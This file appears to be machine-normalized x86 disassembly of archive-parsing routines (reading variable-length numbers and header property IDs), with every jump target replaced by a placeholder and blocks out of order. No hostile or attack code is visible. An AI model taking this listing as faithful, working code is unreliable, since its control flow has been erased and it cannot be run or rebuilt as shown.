mov edx [ ebp + 0xc ]
lea ecx [ ecx + 0x8 ]
call sub_403db9
neg eax
sbb eax eax
pop ecx
and eax 0x8
pop ebp
retn
sub_403f73
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi ecx
xor esi esi
mov ebx edx
cmp [ edi ] esi
je r-xdata
push [ edi ]
push ebx
call [ ebx + 0x4 ]
push [ edi + 0x4 ]
push ebx
call [ ebx + 0x4 ]
push [ edi + 0x8 ]
push ebx
call [ ebx + 0x4 ]
push [ edi + 0xc ]
push ebx
call [ ebx + 0x4 ]
add esp 0x20
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] esi
mov [ edi + 0x10 ] esi
mov [ edi + 0x14 ] esi
mov [ edi + 0x18 ] esi
mov [ edi + 0x1c ] esi
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] esi
cmp [ edi + 0x10 ] esi
jbe r-xdata
mov ecx esi
mov [ ebp - 0x8 ] esi
mov esi [ edi ]
add esi ecx
push [ esi + 0x10 ]
push ebx
call [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
and [ esi + 0x10 ] 0x0
and [ esi + 0x14 ] 0x0
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
inc eax
add ecx 0x18
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ecx
cmp eax [ edi + 0x10 ]
jb r-xdata
xor esi esi
sub_403ffe
push esi
mov esi [ ecx + 0x10 ]
xor edx edx
test esi esi
je r-xdata
mov eax edx
pop esi
retn
mov eax [ ecx ]
add eax 0x4
add edx [ eax ]
lea eax [ eax + 0x18 ]
dec esi
jne r-xdata
sub_404019
push esi
push edi
mov edi ecx
call sub_403ffe
mov esi eax
test esi esi
jne r-xdata
dec esi
jns r-xdata
xor eax eax
xor edx edx
xor eax eax
cmp [ edi + 0x14 ] eax
jbe r-xdata
jmp r-xdata
or eax 0xffffffff
mov ecx [ edi + 0x4 ]
add ecx 0x4
mov edx [ edi + 0xc ]
mov eax [ edx + esi * 8 ]
mov edx [ edx + esi * 8 + 0x4 ]
jmp r-xdata
test eax eax
js r-xdata
inc eax
add ecx 0x8
cmp eax [ edi + 0x14 ]
jb r-xdata
pop edi
pop esi
retn
cmp [ ecx ] esi
je r-xdata
sub_404061
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi edx
cmp [ esi + 0xc ] ebx
je r-xdata
push [ esi ]
push edi
call [ edi + 0x4 ]
push [ esi + 0x4 ]
push edi
call [ edi + 0x4 ]
push [ esi + 0x8 ]
push edi
call [ edi + 0x4 ]
push [ esi + 0xc ]
push edi
call [ edi + 0x4 ]
push [ esi + 0x10 ]
push edi
call [ edi + 0x4 ]
add esp 0x28
mov [ esi ] ebx
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
pop esi
pop ebx
leave
retn
cmp [ esi + 0x18 ] ebx
jbe r-xdata
xor ebx ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov ecx [ esi + 0xc ]
add ecx eax
mov edx edi
call sub_403f73
mov eax [ ebp - 0x4 ]
inc ebx
add eax 0x28
mov [ ebp - 0x4 ] eax
cmp ebx [ esi + 0x18 ]
jb r-xdata
sub_4040db
xor eax eax
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] eax
mov [ ecx + 0x1c ] eax
mov [ ecx + 0x30 ] eax
mov [ ecx + 0x34 ] eax
mov [ ecx + 0x38 ] eax
mov [ ecx + 0x3c ] eax
mov [ ecx + 0x40 ] eax
mov [ ecx + 0x44 ] eax
mov [ ecx + 0x48 ] eax
retn
sub_40410a
push esi
push edi
mov edi ecx
mov esi edx
push [ edi + 0x30 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x34 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x38 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x3c ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x40 ]
push esi
call [ esi + 0x4 ]
push [ edi + 0x44 ]
push esi
call [ esi + 0x4 ]
and [ edi + 0x44 ] 0x0
and [ edi + 0x48 ] 0x0
add esp 0x30
mov edx esi
mov ecx edi
call sub_404061
mov ecx edi
pop edi
pop esi
jmp sub_4040db
sub_404157
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi ecx
xor ecx ecx
mov eax [ esi + 0x18 ]
push edi
mov edi edx
xorps xmm0 xmm0
mov ebx ecx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0xc ] esi
movlpd [ ebp - 0x20 ] xmm0
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
shl eax 0x2
push eax
push edi
call [ edi ]
pop ecx
pop ecx
mov [ esi + 0x30 ] eax
test eax eax
jne r-xdata
mov [ esi + 0x30 ] ecx
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
push 0x2
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
mov edx [ esi + 0x30 ]
add eax 0x18
pop edi
pop esi
pop ebx
leave
retn
shl eax 0x3
push eax
push edi
call [ edi ]
pop ecx
pop ecx
mov [ esi + 0x34 ] eax
test eax eax
je r-xdata
and [ esi + 0x34 ] eax
jmp r-xdata
mov [ edx ] ebx
add ebx [ eax ]
lea edx [ edx + 0x4 ]
lea eax [ eax + 0x28 ]
dec ecx
jne r-xdata
mov ebx [ ebp - 0x8 ]
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esi ]
mov edx [ esi + 0x34 ]
mov ebx [ ebp - 0x8 ]
mov edi [ ebp - 0x1c ]
mov esi [ ebp - 0x20 ]
sub edx eax
shl eax 0x2
push eax
push edi
call [ edi ]
pop ecx
pop ecx
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
and [ esi + 0x38 ] eax
jmp r-xdata
mov [ edx + eax ] esi
mov [ edx + eax + 0x4 ] edi
add esi [ eax ]
adc edi [ eax + 0x4 ]
lea eax [ eax + 0x8 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x14 ]
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
shl eax 0x2
push eax
push edi
call [ edi ]
pop ecx
pop ecx
mov [ esi + 0x3c ] eax
test eax eax
je r-xdata
and [ esi + 0x3c ] eax
jmp r-xdata
xor edx edx
cmp [ esi + 0x1c ] edx
jbe r-xdata
xor eax eax
mov edi [ esi + 0x10 ]
add edi 0x18
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
mov eax [ esi + 0x3c ]
mov [ eax + edx * 4 ] ebx
jne r-xdata
mov ecx ebx
imul ecx ecx 0x28
mov eax [ esi + 0x3c ]
or [ eax + edx * 4 ] 0xffffffff
jmp r-xdata
inc edx
add edi 0x20
cmp edx [ esi + 0x1c ]
jb r-xdata
mov eax [ esi + 0xc ]
inc ecx
mov [ ebp - 0x4 ] ecx
mov esi [ ebp - 0x4 ]
mov ecx ebx
imul ecx ecx 0x28
cmp esi [ ecx + eax + 0x24 ]
mov esi [ ebp - 0xc ]
jb r-xdata
push 0x10
jmp r-xdata
mov eax [ esi + 0x38 ]
mov [ eax + ebx * 4 ] edx
mov eax [ esi + 0xc ]
cmp [ eax + ecx + 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ edi ] al
sete al
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
inc ebx
and [ ebp - 0x4 ] 0x0
pop eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
inc ebx
add ecx 0x28
jmp r-xdata
cmp ebx [ esi + 0x18 ]
jae r-xdata
sub_4042d3
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov al [ ecx ]
mov [ edx ] al
lea eax [ ecx + 0x1 ]
mov [ esi ] eax
xor eax eax
pop esi
retn
push 0x10
pop eax
pop esi
retn
sub_4042f5
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
push edi
mov edi edx
mov ebx ecx
cmp [ ebp + 0x8 ] esi
jbe r-xdata
xor eax eax
lea edx [ esi + edi ]
mov ecx ebx
call sub_4042d3
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
cmp esi [ ebp + 0x8 ]
jb r-xdata
sub_404321
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
xor esi esi
mov ebx ecx
mov [ edi ] esi
pop edi
pop esi
pop ebx
leave
retn
movzx eax [ ebp - 0x1 ]
mov ecx esi
shl eax cl
add esi 0x8
or [ edi ] eax
cmp esi 0x20
jl r-xdata
lea edx [ ebp - 0x1 ]
mov ecx ebx
call sub_4042d3
test eax eax
jne r-xdata
xor eax eax
sub_404357
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov eax ecx
mov esi edx
push edi
lea edx [ ebp - 0x1 ]
mov [ ebp - 0xc ] eax
mov bl 0x80
call sub_4042d3
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov bh [ ebp - 0x1 ]
xor edi edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x8 ] edi
movzx eax bl
movzx ecx bh
dec eax
and eax ecx
mov ecx edi
cdq
shl ecx 0x3
call sub_41cf70
add [ esi ] eax
adc [ esi + 0x4 ] edx
mov ecx [ ebp - 0xc ]
lea edx [ ebp - 0x1 ]
call sub_4042d3
test eax eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
mov ecx [ ebp - 0x8 ]
cdq
call sub_41cf70
or [ esi ] eax
mov eax [ ebp - 0x8 ]
or [ esi + 0x4 ] edx
shr bl 0x1
add eax 0x8
inc edi
mov [ ebp - 0x8 ] eax
cmp eax 0x40
jl r-xdata
test bl bh
je r-xdata
jmp r-xdata
xor eax eax
sub_4043da
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi edx
lea edx [ ebp - 0x8 ]
call sub_404357
test eax eax
jne r-xdata
pop esi
leave
retn
mov ecx [ ebp - 0x4 ]
test ecx ecx
jne r-xdata
push 0x4
pop eax
mov eax [ ebp - 0x8 ]
cmp eax 0x80000000
jae r-xdata
test ecx ecx
jne r-xdata
cmp eax 0x4000000
jae r-xdata
mov [ esi ] eax
xor eax eax
jmp r-xdata
sub_404417
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
mov eax [ ecx + 0x4 ]
mov edx [ ebp + 0x8 ]
jb r-xdata
add [ ecx ] edx
sub eax edx
mov [ ecx + 0x4 ] eax
xor eax eax
pop ebp
retn
ja r-xdata
push 0x10
pop eax
pop ebp
retn
cmp edx eax
jbe r-xdata
sub_40443c
push ebp
mov ebp esp
sub esp 0xc
lea edx [ ebp - 0x8 ]
push esi
mov esi ecx
call sub_404357
test eax eax
jne r-xdata
pop esi
leave
retn
push [ ebp - 0x4 ]
mov ecx esi
push [ ebp - 0x8 ]
call sub_404417
add esp 0x8
sub_404464
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
lea edx [ ebp - 0x8 ]
mov esi ecx
call sub_404357
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
mov edi [ ebp + 0xc ]
or eax [ ebp - 0x4 ]
je r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
push 0x10
pop eax
mov ecx esi
call sub_40443c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ecx esi
call sub_404357
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
jmp r-xdata
sub_4044b4
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi edx
xor ebx ebx
mov eax ecx
push edi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x1 ] bl
mov dl bl
test esi esi
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
push eax
call [ eax ]
mov edi [ ebp + 0x8 ]
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov [ edi ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov dl bl
push 0x2
pop eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
test esi esi
je r-xdata
xor eax eax
test dl dl
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov edi [ ebp - 0x8 ]
test bl dl
setne cl
mov [ edi + eax ] cl
mov eax edi
mov edi [ ebp + 0x8 ]
shr dl 0x1
inc eax
mov [ ebp - 0x8 ] eax
cmp eax esi
jae r-xdata
lea edx [ ebp - 0x1 ]
mov ecx eax
call sub_4042d3
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
mov bl [ ebp - 0x1 ]
mov dl 0x80
sub_404538
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi edx
lea edx [ ebp - 0x1 ]
mov esi ecx
call sub_4042d3
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp [ ebp - 0x1 ] al
jne r-xdata
xor esi esi
test edi edi
jne r-xdata
push [ ebp + 0xc ]
mov edx edi
push [ ebp + 0x8 ]
mov ecx esi
call sub_4044b4
pop ecx
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] esi
test edi edi
je r-xdata
push 0x2
pop eax
jmp r-xdata
xor eax eax
mov eax [ ecx ]
mov [ esi + eax ] 0x1
inc esi
cmp esi edi
jb r-xdata
sub_40459d
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push edi
push ebx
push [ ebp + 0x8 ]
mov eax ecx
mov edi edx
mov [ ebp - 0x4 ] eax
call sub_404538
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop ebx
leave
retn
push esi
xor esi esi
test edi edi
jne r-xdata
mov eax edi
shl eax 0x2
push eax
push ebx
call [ ebx ]
mov ebx [ ebp + 0xc ]
pop ecx
pop ecx
mov [ ebx ] eax
test eax eax
jne r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebx ] esi
test edi edi
je r-xdata
push 0x2
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ esi + eax ] 0x0
je r-xdata
pop esi
inc esi
cmp esi edi
jb r-xdata
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + esi * 4 ]
call sub_404321
test eax eax
jne r-xdata
sub_40460d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi ecx
call sub_404357
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ ebp + 0x8 ]
mov edx esi
mov ecx edi
call sub_4043da
test eax eax
jne r-xdata
push eax
push 0x9
mov ecx edi
call sub_404464
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ esi ]
mov ebx [ ebp + 0x18 ]
test eax eax
jne r-xdata
shl eax 0x3
push eax
push ebx
call [ ebx ]
pop ecx
pop ecx
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
jmp r-xdata
mov eax ecx
push 0x2
pop eax
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp [ esi ] ecx
jbe r-xdata
lea edx [ ebp - 0x8 ]
mov ecx edi
call sub_404357
test eax eax
je r-xdata
mov eax [ eax ]
lea edx [ eax + ecx * 8 ]
mov ecx edi
call sub_404357
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
or eax [ ebp - 0x4 ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
inc ecx
mov [ ebp - 0x4 ] ecx
cmp ecx [ esi ]
jb r-xdata
mov edi [ ebp + 0x10 ]
cmp [ edi ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
jne r-xdata
jmp r-xdata
xor eax eax
cmp [ esi ] 0x0
jne r-xdata
mov ecx edi
call sub_40443c
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push [ esi ]
push ebx
call [ ebx ]
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
and [ edi ] 0x0
jmp r-xdata
mov edx [ esi ]
push ebx
push [ ebp + 0x14 ]
mov ecx edi
push [ ebp + 0x10 ]
call sub_40459d
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
shl eax 0x2
push eax
push ebx
call [ ebx ]
mov edx [ ebp + 0x14 ]
pop ecx
pop ecx
mov [ edx ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
and [ edx ] eax
jmp r-xdata
xor ecx ecx
cmp [ esi ] ecx
jbe r-xdata
mov eax [ edi ]
mov [ ecx + eax ] 0x0
mov eax [ edx ]
and [ eax + ecx * 4 ] 0x0
inc ecx
cmp ecx [ esi ]
jb r-xdata
sub_40474e
push ebp
mov ebp esp
push ecx
lea edx [ ebp - 0x1 ]
call sub_4042d3
test eax eax
jne r-xdata
leave
retn
xor ecx ecx
cmp [ ebp - 0x1 ] cl
push 0x4
pop eax
cmove eax ecx
sub_40476b
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi edx
mov ebx ecx
xor esi esi
lea edx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x44 ] esi
call sub_4043da
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov ecx [ ebp - 0x48 ]
cmp ecx 0x20
ja r-xdata
push 0x4
mov [ edi + 0x10 ] ecx
test ecx ecx
jne r-xdata
mov eax ecx
imul eax eax 0x18
push eax
mov eax [ ebp - 0x3c ]
push eax
call [ eax ]
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
mov [ edi ] esi
jmp r-xdata
mov ecx [ ebp - 0x48 ]
push 0x2
jmp r-xdata
test ecx ecx
je r-xdata
mov [ ebp - 0x4c ] esi
test ecx ecx
je r-xdata
mov edx esi
mov ebx ecx
pop eax
mov edx esi
mov [ ebp - 0x30 ] esi
mov eax [ edi ]
lea edx [ edx + 0x18 ]
mov [ edx + eax - 0x8 ] esi
mov [ edx + eax - 0x4 ] esi
dec ebx
jne r-xdata
mov ebx [ ebp - 0x28 ]
movzx eax [ ebp - 0x19 ]
and eax 0xf
mov [ ebp - 0x20 ] eax
mov eax esi
mov [ ebp - 0x2c ] eax
jbe r-xdata
mov eax esi
test eax eax
jne r-xdata
lea edx [ ebp - 0x18 ]
add edx eax
mov ecx ebx
call sub_4042d3
test eax eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx 0x8
ja r-xdata
mov eax [ ebp - 0x2c ]
inc eax
mov [ ebp - 0x2c ] eax
cmp eax [ ebp - 0x20 ]
jb r-xdata
mov eax [ ebp - 0x24 ]
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
test ecx ecx
je r-xdata
test [ ebp - 0x19 ] 0x10
je r-xdata
mov ebx [ ebp - 0x24 ]
lea eax [ ebp + ecx - 0x19 ]
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x2c ] eax
mov edi ecx
xor ecx ecx
inc ecx
mov [ eax ] ecx
add eax 0x4
mov [ ebp - 0x20 ] eax
mov [ eax ] ecx
mov edx eax
mov ecx ebx
call sub_4043da
test eax eax
jne r-xdata
movzx eax [ eax ]
cdq
mov ecx esi
call sub_41cf70
or [ ebx + 0x8 ] eax
mov eax [ ebp - 0x2c ]
or [ ebx + 0xc ] edx
dec eax
add esi 0x8
mov [ ebp - 0x2c ] eax
dec edi
jne r-xdata
mov edi [ ebp - 0x34 ]
mov ebx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
xor esi esi
test al al
js r-xdata
xorps xmm0 xmm0
lea edx [ ebp - 0x54 ]
mov ecx ebx
movlpd [ ebp - 0x54 ] xmm0
call sub_404357
test eax eax
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x4
mov edx eax
mov ecx ebx
mov [ ebp - 0x20 ] eax
call sub_4043da
test eax eax
jne r-xdata
lea edx [ ebp - 0x19 ]
mov ecx ebx
call sub_4042d3
test eax eax
jne r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x40 ]
add ecx [ eax ]
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x40 ] ecx
mov ecx [ ebp - 0x44 ]
add ecx [ eax ]
mov eax [ ebp - 0x4c ]
inc eax
add edx 0x18
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x30 ] edx
cmp eax [ ebp - 0x48 ]
jb r-xdata
mov eax [ ebp - 0x24 ]
push [ ebp - 0x3c ]
mov edx [ ebp - 0x54 ]
add eax 0x10
mov ecx eax
mov [ ebp - 0x38 ] eax
call sub_403348
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
cmp [ eax ] 0x20
ja r-xdata
mov al [ ebp - 0x19 ]
and al 0xf
movzx eax al
cdq
push edx
push eax
mov ecx ebx
call sub_404417
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi ]
add eax edx
lea edx [ ebp - 0x19 ]
mov ecx ebx
mov [ ebp - 0x24 ] eax
call sub_4042d3
test eax eax
jne r-xdata
test ecx ecx
je r-xdata
mov edx [ ebp - 0x38 ]
push [ ebp - 0x54 ]
mov edx [ edx ]
mov ecx ebx
call sub_4042f5
pop ecx
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0x20
jbe r-xdata
mov al [ ebp - 0x19 ]
test al 0x10
je r-xdata
lea ebx [ ecx - 0x1 ]
mov [ edi + 0x14 ] ebx
test ebx ebx
jne r-xdata
test eax eax
jne r-xdata
mov al [ ebp - 0x19 ]
test al 0x20
je r-xdata
test al 0x20
je r-xdata
lea edx [ ebp - 0x38 ]
call sub_4043da
test eax eax
jne r-xdata
mov eax ebx
shl eax 0x3
push eax
mov eax [ ebp - 0x3c ]
push eax
call [ eax ]
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov al [ ebp - 0x19 ]
xorps xmm0 xmm0
lea edx [ ebp - 0x5c ]
mov ecx ebx
movlpd [ ebp - 0x5c ] xmm0
call sub_404357
test eax eax
jne r-xdata
lea edx [ ebp - 0x38 ]
mov ecx ebx
call sub_4043da
test eax eax
jne r-xdata
mov ecx esi
mov [ ebp - 0x30 ] ecx
test ebx ebx
je r-xdata
push [ ebp - 0x58 ]
mov ecx ebx
push [ ebp - 0x5c ]
call sub_404417
add esp 0x8
mov al [ ebp - 0x19 ]
mov eax [ ebp - 0x40 ]
cmp eax ebx
jb r-xdata
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebp - 0x28 ]
mov edx eax
mov [ ebp - 0x34 ] eax
call sub_4043da
test eax eax
jne r-xdata
mov ebx eax
mov eax [ ebp - 0x44 ]
dec eax
sub ebx eax
mov [ edi + 0x18 ] ebx
jne r-xdata
mov edx [ ebp - 0x34 ]
mov ecx [ ebp - 0x28 ]
add edx 0x4
call sub_4043da
test eax eax
jne r-xdata
mov eax ebx
shl eax 0x2
push eax
mov eax [ ebp - 0x3c ]
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x34 ] ecx
mov [ edi + 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ edi + 0x8 ] esi
mov ecx [ ebp - 0x30 ]
inc ecx
mov [ ebp - 0x30 ] ecx
cmp ecx ebx
jb r-xdata
cmp ebx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0x28 ]
lea edx [ eax + esi * 4 ]
call sub_4043da
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x40 ]
mov eax esi
test ebx ebx
je r-xdata
inc esi
cmp esi ebx
jb r-xdata
cmp eax ebx
je r-xdata
cmp [ edi + 0x14 ] 0x0
mov ecx esi
jbe r-xdata
mov [ ecx ] eax
jmp r-xdata
or ecx 0xffffffff
mov edx [ edi + 0x4 ]
mov ecx [ ebp - 0x34 ]
inc eax
cmp eax ebx
jb r-xdata
test ecx ecx
js r-xdata
inc ecx
add edx 0x8
cmp ecx [ edi + 0x14 ]
jb r-xdata
cmp [ edx ] eax
je r-xdata
sub_404b30
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
mov edi ecx
push 0x0
push 0xb
mov esi edx
mov [ ebp - 0x18 ] edi
call sub_404464
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx esi
mov ecx edi
call sub_4043da
test eax eax
jne r-xdata
mov ecx edi
call sub_40474e
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
imul eax eax 0x28
push eax
mov eax [ ebp + 0xc ]
push eax
call [ eax ]
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx ] eax
xor edx edx
cmp [ esi ] edx
jbe r-xdata
push 0x2
pop eax
jmp r-xdata
xor ebx ebx
cmp [ esi ] ebx
jbe r-xdata
xor ebx ebx
xor ebx ebx
push ebx
push 0xc
mov ecx edi
call sub_404464
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ecx ]
add eax ebx
add ebx 0x28
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
and [ eax + 0xc ] 0x0
and [ eax + 0x10 ] 0x0
and [ eax + 0x14 ] 0x0
and [ eax + 0x18 ] 0x0
and [ eax + 0x1c ] 0x0
and [ eax + 0x20 ] 0x0
and [ eax + 0x24 ] 0x0
inc edx
cmp edx [ esi ]
jb r-xdata
mov [ ebp - 0xc ] ebx
cmp [ esi ] ebx
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
inc ebx
add eax 0x28
mov [ ebp - 0x8 ] eax
cmp ebx [ esi ]
jb r-xdata
lea edx [ ebp - 0x10 ]
mov ecx edi
call sub_404357
test eax eax
jne r-xdata
mov ecx ebx
mov [ ebp - 0x14 ] ebx
mov edx [ ecx ]
push [ ebp + 0xc ]
add edx eax
mov ecx edi
call sub_40476b
pop ecx
test eax eax
jne r-xdata
mov ebx [ ebp + 0x10 ]
shl eax 0x3
push eax
mov eax [ ebp + 0xc ]
push eax
call [ eax ]
pop ecx
pop ecx
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
and [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
cmp [ ebp - 0x10 ] 0xa
jne r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov [ ebp - 0x8 ] ecx
test eax eax
je r-xdata
mov ecx edi
call sub_40443c
xor eax eax
cmp [ ebp - 0xc ] eax
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
inc eax
add ecx 0x28
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] ecx
cmp eax [ esi ]
jb r-xdata
mov eax [ ebx + 0xc ]
lea edx [ eax + ecx * 8 ]
mov ecx edi
call sub_404357
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
mov ecx edi
call sub_404357
test eax eax
je r-xdata
mov edx [ esi ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
push ebx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call sub_40459d
add esp 0xc
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax ]
add ebx ecx
mov ecx ebx
call sub_403ffe
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
inc ecx
mov [ ebp - 0x8 ] ecx
cmp ecx [ ebp - 0x4 ]
jb r-xdata
mov eax [ ebp - 0x10 ]
or eax [ ebp - 0xc ]
je r-xdata
jmp r-xdata
push [ ebp - 0x4 ]
push ebx
call [ ebx + 0x4 ]
push [ ebp - 0x8 ]
push ebx
call [ ebx + 0x4 ]
mov eax [ ebp - 0x14 ]
add esp 0x10
jmp r-xdata
xor edx edx
cmp [ esi ] edx
jbe r-xdata
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
xor edi edi
